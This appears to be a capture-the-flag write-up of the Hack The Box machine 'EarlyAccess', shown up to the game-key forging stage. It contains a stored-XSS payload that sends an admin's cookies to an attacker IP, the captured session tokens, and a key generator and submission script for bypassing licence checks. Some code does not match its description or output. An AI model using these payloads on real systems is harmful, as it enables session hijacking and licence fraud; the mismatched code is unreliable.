# [earlyaccess](https://app.hackthebox.com/machines/375)

> The Linux server of Early Access, an indie game developer. The server is running several containers through `docker-compose`: a web server, a game key verification server, a database server, and a server hosting a game. An XSS vulnerability in the web server leads to access to its administrative panel, which leaks the source code for how game keys are verified. Reversing a valid game key grants access to the game portion of the web server, which contains a second-order SQL injection vulnerability that can be used to dump and crack the hash of the administrative user. This credential grants access to a development web server, which contains a local file inclusion vulnerability that leads to remote command execution and a low-privilege shell on the web server container. A credential on this container leads to the disclosure of another credential via the game key verification API, which can be used to access the primary host itself via SSH. A vulnerability in the game server container makes it possible to obtain `root` privileges there, which can be used to subsequently gain `root` privileges on the host itself.

---

## Open Port Enumeration

```bash
$ sudo masscan -p1-65535 10.129.157.231 --rate=1000 -e tun0 --output-format grepable --output-filename enum/early-access.masscan
$ cat enum/early-access.masscan  | grep open | cut -d' ' -f5 | cut -d'/' -f1 | sort -u | tr '\n' ','
22,443,80,
```

According to [launch.net](https://launchpad.net/debian/buster/+source/openssh), the OpenSSH banner indicates the target's operating system is Debian 10 (Buster).

Port 80 is an Apache server version 2.4.38 whose index page redirects to the target's port 443, `https://earlyaccess.htb`. Add this domain name to the local DNS resolver.

```bash
$ sudo nmap -sC -sV -O -p22,443,80 10.129.157.231 -oA enum/early-access
Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-15 13:21 EST
Nmap scan report for 10.129.157.231
Host is up (0.045s latency).

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 e4:66:28:8e:d0:bd:f3:1d:f1:8d:44:e9:14:1d:9c:64 (RSA)
|   256 b3:a8:f4:49:7a:03:79:d3:5a:13:94:24:9b:6a:d1:bd (ECDSA)
|_  256 e9:aa:ae:59:4a:37:49:a6:5a:2a:32:1d:79:26:ed:bb (ED25519)
80/tcp  open  http     Apache httpd 2.4.38
|_http-title: Did not follow redirect to https://earlyaccess.htb/
|_http-server-header: Apache/2.4.38 (Debian)
443/tcp open  ssl/http Apache httpd 2.4.38 ((Debian))
|_http-title: EarlyAccess
| ssl-cert: Subject: commonName=earlyaccess.htb/organizationName=EarlyAccess Studios/stateOrProvinceName=Vienna/countryName=AT
| Not valid before: 2021-08-18T14:46:57
|_Not valid after:  2022-08-18T14:46:57
| tls-alpn:
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
|_http-server-header: Apache/2.4.38 (Debian)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 4.15 - 5.6 (95%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.3 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: 172.18.0.102; OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.46 seconds
```

---

## Port 80 Enumeration

### Content Discovery

All requests result in a 301 redirect to `https://earlyaccess.htb`, so nothing of note here.

```bash
$ gobuster dir -u http://earlyaccess.htb -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-words.txt -x php -b 301
```

### Virtual Host Discovery

There are two virtual hosts: `dev.earlyaccess.htb` and `game.earlyaccess.htb`. Add these to the local DNS resolver.

```bash
$ gobuster vhost -u http://earlyaccess.htb -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -o http-vhost.txt
$ cat http-vhost.txt | grep '(Status: 200)'
Found: dev.earlyaccess.htb (Status: 200) [Size: 2685]
Found: game.earlyaccess.htb (Status: 200) [Size: 2709]
```

### `dev` Subdomain Content Discovery

`/actions/` is interesting. Unfortunately, it's behind a login page.

```bash
$ gobuster dir -u http://dev.earlyaccess.htb -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-words.txt -x php
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://dev.earlyaccess.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-words.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
2022/02/16 13:38:28 Starting gobuster in directory enumeration mode
===============================================================
/includes             (Status: 301) [Size: 329] [--> http://dev.earlyaccess.htb/includes/]
/index.php            (Status: 200) [Size: 2685]
/home.php             (Status: 302) [Size: 4426] [--> /index.php]
/assets               (Status: 301) [Size: 327] [--> http://dev.earlyaccess.htb/assets/]
/.                    (Status: 200) [Size: 2685]
/actions              (Status: 301) [Size: 328] [--> http://dev.earlyaccess.htb/actions/]

===============================================================
2022/02/16 13:48:40 Finished
===============================================================
```

### `game` Subdomain Content Discovery

`scoreboard.php` and `leaderboard.php` are interesting. `/actions/` is here oncce again. Unfortunately, they are all stuck behind a login page.

```bash
$ gobuster dir -u http://game.earlyaccess.htb -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-words.txt -x php
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://game.earlyaccess.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-words.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
2022/02/16 13:55:59 Starting gobuster in directory enumeration mode
===============================================================
/includes             (Status: 301) [Size: 331] [--> http://game.earlyaccess.htb/includes/]
/index.php            (Status: 200) [Size: 2709]
/assets               (Status: 301) [Size: 329] [--> http://game.earlyaccess.htb/assets/]
/.                    (Status: 200) [Size: 2709]
/actions              (Status: 301) [Size: 330] [--> http://game.earlyaccess.htb/actions/]
/game.php             (Status: 302) [Size: 7008] [--> /index.php]
/leaderboard.php      (Status: 302) [Size: 5933] [--> /index.php]
/scoreboard.php       (Status: 302) [Size: 5101] [--> /index.php]

===============================================================
2022/02/16 14:06:19 Finished
===============================================================
```

---

## Port 443 Enumeration

The index page of `https://earlyaccess.htb` is the website of **Mamba**, the newest multiplayer indie game from **EarlyAccess Studios**, an award-winning indie game development studio based out of Vienna, Austria.

The **About Us** section reveals the email address `admin@earlyaccess.htb`.

The **Twitter Feed** section reveals they are experiencing "issues with [their] game-key verification API."

There is also a form to register for early access to **Mamba** at `https://earlyaccess.htb/register` and a login form at `https://earlyaccess.htb/login`.

According to [Wappalyzer](https://www.wappalyzer.com/), the application is built with Apache and Laravel on the backend and Alpine.js, along with various other common JavaScript libraries, on the frontend.

### Content Discovery

`gobuster` discovers several paths, all of which are linked directly from the **Early Access** dashboard at `https://earlyaccess.htb/dashboard`.

```bash
$ gobuster dir -u https://earlyaccess.htb -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-words.txt -x php -k                      1 ⨯
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://earlyaccess.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-words.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
2022/02/15 15:26:42 Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 321] [--> https://earlyaccess.htb/images/]
/login                (Status: 200) [Size: 3026]
/admin                (Status: 302) [Size: 362] [--> https://earlyaccess.htb/login]
/js                   (Status: 301) [Size: 317] [--> https://earlyaccess.htb/js/]
/css                  (Status: 301) [Size: 318] [--> https://earlyaccess.htb/css/]
/index.php            (Status: 200) [Size: 12279]
/register             (Status: 200) [Size: 2902]
/contact              (Status: 302) [Size: 362] [--> https://earlyaccess.htb/login]
/forum                (Status: 302) [Size: 362] [--> https://earlyaccess.htb/login]
/logout               (Status: 405) [Size: 825]
/.                    (Status: 301) [Size: 185] [--> https://earlyaccess.htb:8443/./]

===============================================================
2022/02/15 15:36:47 Finished
===============================================================
```

---

## Early Access Dashboard

> Enumeration as a regular user

### Landing Page

The **Early Acccess** dashboard's landing page indicates that if customers have already received a game key they should go ahead and register it to be able to access the game. It appears that customers can register game keys at `/key`.

It also indicates that if customers haven't yet received a game key, they should message the administrative staff (`admin@earlyaccess.htb` presumably) to be put on the wait list.

### Messaging Page

This page gives access to an **Inbox**, **Outbox**, and **Contact Us** form that can be used to communicate with **Early Access's** administrative staff at `admin@earlyaccess.htb`.

### Forum Page

This page contains several forum messages from various users having various issues with **Mamba**.

`TRyHArD`'s game was crashing when they passed 999 points, but apparently the development team resolved this issue and restored their progress.

`T04st3r` complains that the game is laggy.

When `3lit3H4kr` tried to register the game key they purchased from the store, they were met with the error "Game-key is invalid! If this issue persists, please contact the admin!" **Early Access's** support team responded that their game key verification API is currently experiencing issues and that their fallback solution is to have each customer send their game key to the administrative staff via the **Messaging** page. The administrative staff will presumably manually verify the game key and grant the user access to **Mamba**.

`SingleQuoteMan`'s original username resulted in "strange errors" on **Mamba's** scoreboard. The support team provided a temporary fix by preventing the *creation* of accounts with "invalid usernames." This seems to indicate that the scoreboard doesn't properly sanitize *currently* invalid usernames before passing them to a SQL database.

### Store Page

The store is currently under maintenance.

### Key Registration Page

This is the form where customers can submit a game key for verification and linking to their account. According to the forum, this feature isn't currently working, but **Early Access** is trying to bring it back online.

Submitting the undoubtedly invalid game key `AAAAA-BBBBB-CCCCC-DDDDD-1234` sends the following HTTP request:

```http
POST /key/add HTTP/1.1
Host: earlyaccess.htb
Cookie: XSRF-TOKEN=eyJpdiI6IitYK3hCdUJHSitYbmNGVFZuMzI5aVE9PSIsInZhbHVlIjoiSXNJQlZQOU4yRDZ6dVRMdnU5OVFMdkZwKzA0VFNkWTJuUXlGeGNmRkRCbnRVcytPU3Z6dXZ6ZjRyL2hqTi9NdkI0a1BTZVo2Q0VlNkFLVm9lajZPN0M3SXl0MkZjNEJ4MFEyVW9wMjUzcmFWaFBWdEtyOElwdWEwdmYzWnFzTmUiLCJtYWMiOiIxMzVkOTg3MDlmNDVmYzk2ZjFkNjZlYTc3MmM0ODk2MzUwZDQyYWE0Y2Q2OTBhNzk3YzhmOTE4NzFkOTFkYjgzIn0%3D; earlyaccess_session=eyJpdiI6InBoRUZSYW1GNnlLdmlOMW9QanlXaEE9PSIsInZhbHVlIjoiVkJmcFFPVFRqbjFFRDZKWFNreVNzOU81N2gydWZnMjNpQ3JnRG01WDlWNktPcVMxaDNscjJ6R1JBaDFvcmdtcUtQb1FqdVNOUkZ3NnNUT3gzSkR5MXRqS3dIdEttRnZYZEdSVlB3Sng0NUgzUXRoWm9Hc2RINEJZNFBCTkprSkIiLCJtYWMiOiI2NGJkODRiOTgyODllMDRjNjdjNjliYzMxMjNiM2VhNjgwZWI0N2FiZTJkZjk1MTg4NzI5ZmE1NmYzMDY5M2UwIn0%3D
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 80
Origin: https://earlyaccess.htb
Referer: https://earlyaccess.htb/key
Upgrade-Insecure-Requests: 1
Te: trailers
Connection: close

_token=wttjyNnbU0jpXGmmkT3Mv6FB8QSo7vQhj3WOglUK&key=AAAAA-BBBBB-CCCCC-DDDDD-1234
```

### User Profile Page

The user profile page at `/user/profile` allows a user to change their username, email address, and password. It also allows users to log out of all browser sessions or delete their account.

---

## Early Access Dashboard

> XSS as regular user to access as `admin`

The feature that allows a user to message the administrative staff seems ripe for an XSS vulnerability. However, injecting an XSS payload in both the message title and the message body indicates that the injected HTML is safely escaped in both the message preview  at `/messages/sent` and the message itself at `/messages/$MESSAGE_ID`. Neither of these parameters seem vulnerable to XSS.

![](images/Pasted%20image%2020220215174547.png)

![](images/Pasted%20image%2020220215174636.png)

Note how the user's username also appears in the message at `/message/$MESSAGE_ID` (**Message from: tgihf**). `SingleQuoteMan`'s post on the forum seems to indicate that there were issues parsing "invalid" characters in users' usernames and the support team made it seem like, instead of fixing the parsing logic, they simply prevented users from registering usernames with "invalid" characters.

It is possible to change the current user's username via the profile page at `/user/profile`. Perhaps it is possible to inject an XSS payload into the username and have it execute when the administrative staff opens a message.

On the attacking machine, start a web server.

```bash
$ sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Change the username to the following XSS payload, where `10.10.14.109` is the IP address of the attacker's web server. This payload will disclose the cookies that the connecting account has associated with the web application. Assuming an administrative user is the one connecting, these cookies could be reused for administrative access to the web application.

```html
<script>document.location='http://10.10.14.109/tgihf.js?c='+document.cookie</script>
```

Send an arbitrary message. Wait a bit and receive a connection from the administrative staff containing the `XSRF-TOKEN` and `earlyaccess_session` cookies.

```bash
$ sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.157.231 - - [15/Feb/2022 17:34:24] "GET /tgihf.js?c=XSRF-TOKEN=eyJpdiI6IkhaTG5qWExKZndsNlM3ODR4TVF0b1E9PSIsInZhbHVlIjoiZ1ZjYlRsSVNvaWw3WTBraGtyNkwrMHRXWjl1RlVwbjZzbHIzY0w4MU9wSVZmYmtaYWtLdnBuWmFzeTBuQkNrMG5YL0NlMjlvQW1jTXFEYVhCTmlVODdmK0NQR0JNU0lJVTNkMDhSOG9uTVZDVytFbldBODF3MmJYUTRwd3NuVE0iLCJtYWMiOiIxZDBiOTdiMWUyZmQ3ZWU4M2U2M2M0NjNlOTljNjk3ZmU0ZTcwNjIwNGE0NmVlNDQ1NTY4ZjQ5ODQ1NDNlOGUxIn0%3D;%20earlyaccess_session=eyJpdiI6IlZJaFV3cW94Q2FLT0pLS3lud09mUmc9PSIsInZhbHVlIjoidDM1UFlpL014MjN4ZjRJdFRjbjVTdHJoTGtVdkZ3SDJ3eDlEZEphT09xUkt1bklqeGNxWTkycm8wOWIxNzQ4UEpOVEw2OTdjajNQN0dsOVF2MTdzYmpWbnBRMDlqRHcwYzNBZVlnbGYzVW4wRDRMOG53M0ZQT0V2TzhYbHRXYzMiLCJtYWMiOiJhY2I4YjJiMWI4YTZmZTEzYmVjMzY3NTQwZDdlZmJmMTk3NDQ0Y2M2ZjEzYjEyMzBiZjViZDA0NjIxNTZlMTMwIn0%3D HTTP/1.1" 404 -
```

Update the browser's `earlyaccess_session` cookie to this value and visit `/dashboard` as the `admin` user.

![](images/Pasted%20image%2020220215175636.png)

---

## Early Access Dashboard

> Web application enumeration as `admin`

When logged in as `admin`, the **Early Access** dashboard offers some different functionality than when logged in a regular user: an **Admin Panel** and links to `http://dev.earlyaccess.htb` and `http://game.earlyaccess.htb`.

![](images/Pasted%20image%2020220215180155.png)

Attempting to reuse the `earlyaccess_session` cookie value to access `http://dev.earlyaccess.htb` and `http://game.earlyaccess.htb` simply renders their respective login forms. There is no user profile option for `admin`, making it impossible to change its password here.

The **Admin Panel** offers four pieces of functionality:

- The **Admin panel** option lists the current number of users and messages.
- The **User management** option is still under construction.
- The **Download backup** option contains a link to download the game-key validator script for offline execution. Administrative users must presumably pass user-submitted game keys through this algorithm to determine their validity.
- The **Verify a game-key** option appears to be similar to the game key verification form available to standard users that isn't currently working. There is a key distinction though: the administrative endpoint is `/key/verify`, while the standard user endpoint is `/key/add`.

The **Download backup** option is the most interesting. Download the game-key validator algorithm. It's a ZIP archive, `backup.zip`. The archive contains a single Python script, `validate.py`.

---

## Game Key Validation Script - Source Code Analysis

The script is used as follows:

```bash
python3 validate.py $GAME_KEY
```

The script consists of a single class, `Key`, and a main function. When executed with a single command line argument, the script creates a `Key` object from that command line argument and then runs `Key`'s `check()` method which returns a `bool` value indicating whether the command-line argument represents a valid or invalid game key.

The `Key` object is initialized not just with the user-input game key value, but also a `magic_value` set to the string `XP`, which is static and the same on the live API. It is also initialized with a `magic_num` integer value, which apparently needs to be synchronized with the `magic_num` value on the API which changes every 30 minutes.

```python
class Key:
    key = ""
    magic_value = "XP" # Static (same on API)
    magic_num = 346 # TODO: Sync with API (api generates magic_num every 30min)

    def __init__(self, key:str, magic_num:int=346):
        self.key = key
        if magic_num != 0:
            self.magic_num = magic_num
```

`Key`'s `check()` method performs six checks on the input game key to determine if it is valid.

```python
    def check(self) -> bool:
        if not self.valid_format():
            print('Key format invalid!')
            return False
        if not self.g1_valid():
            return False
        if not self.g2_valid():
            return False
        if not self.g3_valid():
            return False
        if not self.g4_valid():
            return False
        if not self.cs_valid():
            print('[Critical] Checksum verification failed!')
            return False
        return True
```

---

### Check One: `valid_format()`

`Key`'s `valid_format()` method uses a regular expression to ensure the game key is of the proper format. The valid format is a string comprised of five groups of characters, each delimited by a dash (`-`). The first, second, and fourth groups consists of five uppercase ASCII characters or digits. The third group consists of four uppercase ASCII characters and ends with a single digit. The fifth group consists of a 1- to 5-digit integer.

```python
def valid_format(self) -> bool:
	return bool(match(r" ", self.key))
```

An example string that matches this regular expression is `AAAAA-BBBBB-CCCC1-DDDDD-12345`.

---

### Check Two: `g1_valid()`

```python
def g1_valid(self) -> bool:
	g1 = self.key.split('-')[0]
	r = [(ord(v)<<i+1)%256^ord(v) for i, v in enumerate(g1[0:3])]
	if r != [221, 81, 145]:
		return False
	for v in g1[3:]:
		try:
			int(v)
		except:
			return False
	return len(set(g1)) == len(g1)
```

`Key`'s `g1_valid()` method evaluates the first group of characters in the key.

```python
...
	g1 = self.key.split('-')[0]
...
```

`g1_valid()` takes the first three characters from group 1 and runs each through a fairly complex mathematical operation to ensure each comes out to a particular value: the first character to 221, the second to 81, and the third to 145. This indicates that all valid game keys have these same three starting characters in group 1.

```python
...
	r = [(ord(v)<<i+1)%256^ord(v) for i, v in enumerate(g1[0:3])]
	if r != [221, 81, 145]:
		return False
...
```

The characters that produce the values 221, 81, and 145 can be determined by using the function to map all possible input characters (`[A-Z0-9]`) to their respective output values and then determine which input character produced the target numeric values. Doing this indicates the first three characters of group 1 must be `KEY`.

```python
>>> f = lambda v, i: (ord(v)<<i+1)%256^ord(v)
>>> {f(c, 0): c for c in string.ascii_uppercase + string.digits}[221]
'K'
>>> {f(c, 1): c for c in string.ascii_uppercase + string.digits}[81]
'E'
>>> {f(c, 2): c for c in string.ascii_uppercase + string.digits}[145]
'Y'
```

Next, `g1_valid()` ensures the final two characters in group 1 are integers.

```python
...
	for v in g1[3:]:
		try:
			int(v)
		except:
			return False
...
```

Lastly, `g1_valid()` ensures there are no duplicate values in group 1.

```python
	return len(set(g1)) == len(g1)
```

Thus for a key to pass `g1_valid()`, its group one must begin with the characters `KEY` and end with two distinct digits.

For example:

```python
>>> g1_valid("KEY12")
True
>>> g1_valid("KEY11")
False
>>> g1_valid("FOO12")
False
```

---

### Check Three: `g2_valid()`

```python
def g2_valid(g2) -> bool:
	p1 = g2[::2]
	p2 = g2[1::2]
	return sum(bytearray(p1.encode())) == sum(bytearray(p2.encode()))
```

`Key`'s `g2_valid()` method evalutes the second group of characters in the key.

```python
...
	g2 = self.key.split('-')[1]
...
```

`g2_valid()` splits the second group of characters into two parts: the first part consisting of the three characters at indices 0, 2, and 4 and the second part consisting of the two characters at indices 1 and 3. To make it more concrete:

```python
>>> g2 = '01234'
>>> p1 = g2[::2]
>>> p2 = g2[1::2]
>>> p1
'024'
>>> p2
'13'
```

The final line of `g2_valid()` takes each part, converts each character into a byte (equivalent to its ASCII decimal value), sums the bytes, and then returns true if the two parts produced the same sum.

Thus, the second group `2K2K2` will pass the validation check. The byte / decimal ASCII value of `2` is 50 and `K` is 75. The sum of part 1 will be 50 + 50 + 50 = 150 and the sum of part 2 will be 75 + 75 = 150. Both sums are equal.

```python
>>> g2_valid('2K2K2')
True
>>> g2_valid('22222')
False
```

---

### Check Four: `g3_valid()`

```python
def g3_valid(self) -> bool:
	# TODO: Add mechanism to sync magic_num with API
	g3 = self.key.split('-')[2]
	if g3[0:2] == self.magic_value:
		return sum(bytearray(g3.encode())) == self.magic_num
	else:
		return False
```

`Key`'s `g3_valid()` method evaluates the third group of characters in the key.

```python
...
	g3 = self.key.split('-')[2]
...
```

`g3_valid()` first ensures the first two characters of the key are the same as `magic_value`, which is a static `XP`. It then checks to see if the sum of the entire third group's bytes is equal to `magic_num`. If both of these hold true, the game key passes this check.

```python
...
	if g3[0:2] == self.magic_value:
			return sum(bytearray(g3.encode())) == self.magic_num
		else:
			return False
...
```

Unlike `magic_value`, `magic_num` rotates every 30 minutes on the server side. Without this value, it seems impossible to construct a valid game key.

However, because the first two characters of the third group are static (`XP`), that only leaves the final three characters in the group whose byte sum must be guessed to achieve the correct `magic_num` value. Since the first two of those characters are uppercase letters and the third character is a digital, the keyspace of the final three characters starts at `AA0` and ends at `ZZ9`.

Summing the starting and ending points of the keyspace indicates that it is only comprised of 60 possible combinations.

```python
>>> sum(bytearray("XPAA0".encode()))
346
>>> sum(bytearray("XPZZ9".encode()))
405
```

This indicates that valid third groups can be trivially generated for every possible `magic_num` value. Since `magic_num` only rotates every 30 minutes, it is likely possible to construct a game key with every possible group three combination that eventually matches the server-side `magic_num` value.

```python
group3s = {}
for k in string.digits:
    for j in string.ascii_uppercase:
        for i in string.ascii_uppercase:
            group3 = f"XP{i}{j}{k}"
            num = sum(bytearray(group3.encode()))
            if sum not in group3s:
                group3s[num] = group3
group3s = group3s.values()
```

---

### Check Five: `g4_valid()`

```python
def g4_valid(key) -> bool:
	return [ord(i)^ord(g) for g, i in zip(key.split('-')[0], key.split('-')[3])] == [12, 4, 20, 117, 0]
```

`Key`'s `g4_valid()` method evaluates the fourth group of characters in the key.

It first zips the first group with the fourth group, creating a list of tuples where each element is one element from the first group and one element from the fourth group. It then creates a new list that is the result of XORing each of the tuples in the zipped list. If the resultant list is `[12, 4, 20, 117, 0]`, the check passes.

Since the values in the first group and the target list are all known, this process can be easily reversed to determine the values in the fourth group that will result in the target values.

```python
targets = [12, 4, 20, 117, 0]
group4 = [ord(i)^j for i, j in zip(group1, targets)]
group4 = "".join([chr(c) for c in group4])
```

---

### Check Six: `cs_valid()`

```python
def cs_valid(self) -> bool:
	cs = int(self.key.split('-')[-1])
	return self.calc_cs() == cs

def calc_cs(self) -> int:
	gs = self.key.split('-')[:-1]
	return sum([sum(bytearray(g.encode())) for g in gs])
```

`Key`'s `cs_valid()` method evaluates the fifth and final group of characters in the key. The fifth group is a one to five digit integer.

`cs_valid()` first converts the fifth group from a string of digits into an integer.

It calls `Key`'s `calc_cs()` method, which sums the bytes of the first four groups of the game key.

These two values are compared. If they are equal, the check passes.

A valid fifth group can be generated from an arbitrary first four groups using the following:

```python
groups = [group1, group2, group3, group4]
group5 = sum([sum(bytearray(g.encode())) for g in groups])
```

---

## Game Key Generation

Putting it all together, the following Python function generates valid game keys for all 60 possible `magic_num` values.

```python
import random
import string


def gen_game_keys():

        # Static group 1
        group1 = "KEY12"

        # Static group 2
        group2 = "2K2K2"

        # All possible group 3 values
        group3s = {}
        for i in string.ascii_uppercase:
                for j in string.ascii_uppercase:
                        for k in string.digits:
                                group3 = f"XP{i}{j}{k}"
                                num = sum(bytearray(group3.encode()))
                                if sum not in group3s:
                                        group3s[num] = group3
        group3s = group3s.values()

        # Generate group 4 based on group 1
        targets = [12, 4, 20, 117, 0]
        group4 = [ord(i)^j for i, j in zip(group1, targets)]
        group4 = "".join([chr(c) for c in group4])

        # Generate group 5 based on the rest of the groups
        for group3 in group3s:
                groups = [group1, group2, group3, group4]
                group5 = sum([sum(bytearray(g.encode())) for g in groups])

                # Construct the game key
                final = f"{group1}-{group2}-{group3}-{group4}-{group5}"
                yield final
```

---

## Game Key Validation

Ensure it is possible to generate a valid game key for any of the possible `magic_num` values using the offline game key validation script to validate the generated keys. Call the following script's `offline_validation_test()` function for this.

```python
# validate-game-keys.py

import random
import string
import time

from bs4 import BeautifulSoup
import requests

from validate import Key


def gen_game_keys():

        # Static group 1
        group1 = "KEY12"

        # Static group 2
        group2 = "2K2K2"

        # All possible group 3 values
        group3s = {}
        for i in string.ascii_uppercase:
                for j in string.ascii_uppercase:
                        for k in string.digits:
                                group3 = f"XP{i}{j}{k}"
                                num = sum(bytearray(group3.encode()))
                                if sum not in group3s:
                                        group3s[num] = group3
        group3s = group3s.values()

        # Generate group 4 based on group 1
        targets = [12, 4, 20, 117, 0]
        group4 = [ord(i)^j for i, j in zip(group1, targets)]
        group4 = "".join([chr(c) for c in group4])

        # Generate group 5 based on the rest of the groups
        for group3 in group3s:
                groups = [group1, group2, group3, group4]
                group5 = sum([sum(bytearray(g.encode())) for g in groups])

                # Construct the game key
                final = f"{group1}-{group2}-{group3}-{group4}-{group5}"
                yield final


def is_valid(key: str, earlyaccess_session: str):

    # Grab CSRF token from admin key add page
    response = requests.get(
            "https://earlyaccess.htb/key",
            verify=False,
            cookies={"earlyaccess_session": earlyaccess_session}
    )
    assert response.status_code == 200
    soup = BeautifulSoup(response.text, "html.parser")
    csrf_token = soup.find("input", {"name": "_token"})["value"]

    # Attempt to validate key
    response = requests.post(
        "https://earlyaccess.htb/key/verify",
        data={
            "_token": csrf_token,
            "key": key
        },
        verify=False,
        cookies={"earlyaccess_session": earlyaccess_session}
    )
    assert response.status_code == 200
    return "Game-key is invalid!" not in response.text


def offline_validation_test():
    for game_key in gen_game_keys():
        for magic_num in range(346, 406):
            key = Key(game_key, magic_num)
            if key.check():
                print(f"[*] Key {game_key} Magic Number {magic_num} VALID")


def online_validation_test():
    earlyaccess_session = "eyJpdiI6IjZGRE9xUDkyNnl0cEF2b3Uxa29DRkE9PSIsInZhbHVlIjoiazNQQmJSdVpEcExpNGZTMExpS3ZpWTk2NEo3dW0yZXJKc2dwQy9ZLzFSdmFVNGF3OFZpcHBZQzVRWXlwRDdKVGVtZjY3V1J6bHZGa0kyVWhoNld2WWNEMDl0WlRxOEVmY1dPMlBNZWZzc0hiMkw1aTJTTUVpa0lqVVlXbUZMR1EiLCJtYWMiOiI1NDI0NTg1Y2JlNjFlYmFkMjQzMDVjZDBmYTgwOWYyOWJkYTRiYTJkZmFiMDhkMGMyM2VhMzZmYjZkZjJiNjQ5In0%3D"
    count = 1
    for game_key in gen_game_keys():
        print(f"[{count}] Trying {game_key}")
        if is_valid(game_key, earlyaccess_session):
            print(f"[*] Valid game key: {game_key}")
            break
        time.sleep(1)
        count += 1


if __name__ == "__main__":
    offline_validation_test()
    #online_validation_test()
```

```bash
$ python3 validate-game-keys.py
[*] Key KEY68-2K2K2-XPAA0-GAMC8-1325 Magic Number 346 VALID
[*] Key KEY68-2K2K2-XPBA0-GAMC8-1326 Magic Number 347 VALID
[*] Key KEY68-2K2K2-XPCA0-GAMC8-1327 Magic Number 348 VALID
[*] Key KEY68-2K2K2-XPDA0-GAMC8-1328 Magic Number 349 VALID
[*] Key KEY68-2K2K2-XPEA0-GAMC8-1329 Magic Number 350 VALID
[*] Key KEY68-2K2K2-XPFA0-GAMC8-1330 Magic Number 351 VALID
[*] Key KEY68-2K2K2-XPGA0-GAMC8-1331 Magic Number 352 VALID
[*] Key KEY68-2K2K2-XPHA0-GAMC8-1332 Magic Number 353 VALID
[*] Key KEY68-2K2K2-XPIA0-GAMC8-1333 Magic Number 354 VALID
[*] Key KEY68-2K2K2-XPJA0-GAMC8-1334 Magic Number 355 VALID
[*] Key KEY68-2K2K2-XPKA0-GAMC8-1335 Magic Number 356 VALID
[*] Key KEY68-2K2K2-XPLA0-GAMC8-1336 Magic Number 357 VALID
[*] Key KEY68-2K2K2-XPMA0-GAMC8-1337 Magic Number 358 VALID
[*] Key KEY68-2K2K2-XPNA0-GAMC8-1338 Magic Number 359 VALID
[*] Key KEY68-2K2K2-XPOA0-GAMC8-1339 Magic Number 360 VALID
[*] Key KEY68-2K2K2-XPPA0-GAMC8-1340 Magic Number 361 VALID
[*] Key KEY68-2K2K2-XPQA0-GAMC8-1341 Magic Number 362 VALID
[*] Key KEY68-2K2K2-XPRA0-GAMC8-1342 Magic Number 363 VALID
[*] Key KEY68-2K2K2-XPSA0-GAMC8-1343 Magic Number 364 VALID
[*] Key KEY68-2K2K2-XPTA0-GAMC8-1344 Magic Number 365 VALID
[*] Key KEY68-2K2K2-XPUA0-GAMC8-1345 Magic Number 366 VALID
[*] Key KEY68-2K2K2-XPVA0-GAMC8-1346 Magic Number 367 VALID
[*] Key KEY68-2K2K2-XPWA0-GAMC8-1347 Magic Number 368 VALID
[*] Key KEY68-2K2K2-XPXA0-GAMC8-1348 Magic Number 369 VALID
[*] Key KEY68-2K2K2-XPYA0-GAMC8-1349 Magic Number 370 VALID
[*] Key KEY68-2K2K2-XPZA0-GAMC8-1350 Magic Number 371 VALID
[*] Key KEY68-2K2K2-XPZB0-GAMC8-1351 Magic Number 372 VALID
[*] Key KEY68-2K2K2-XPZC0-GAMC8-1352 Magic Number 373 VALID
[*] Key KEY68-2K2K2-XPZD0-GAMC8-1353 Magic Number 374 VALID
[*] Key KEY68-2K2K2-XPZE0-GAMC8-1354 Magic Number 375 VALID
[*] Key KEY68-2K2K2-XPZF0-GAMC8-1355 Magic Number 376 VALID
[*] Key KEY68-2K2K2-XPZG0-GAMC8-1356 Magic Number 377 VALID
